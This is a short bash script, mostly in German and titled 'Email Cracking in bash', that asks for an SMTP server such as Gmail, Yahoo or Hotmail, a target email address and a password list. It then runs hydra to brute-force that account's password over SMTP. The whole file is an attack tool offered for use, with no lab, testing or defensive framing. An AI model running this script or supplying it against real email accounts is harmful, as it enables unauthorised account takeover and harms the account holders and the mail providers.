echo Email Cracking in bash
echo geschrieben von: PeraxCoding
echo NOTE: du brauchst eine passwortliste!
echo START:
echo Such dir einen SMTP service aus: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:
read smtp
echo Email adresse eingeben:
read email
echo Provide Directory of Wordlist for Passwords:
read wordlist

hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp
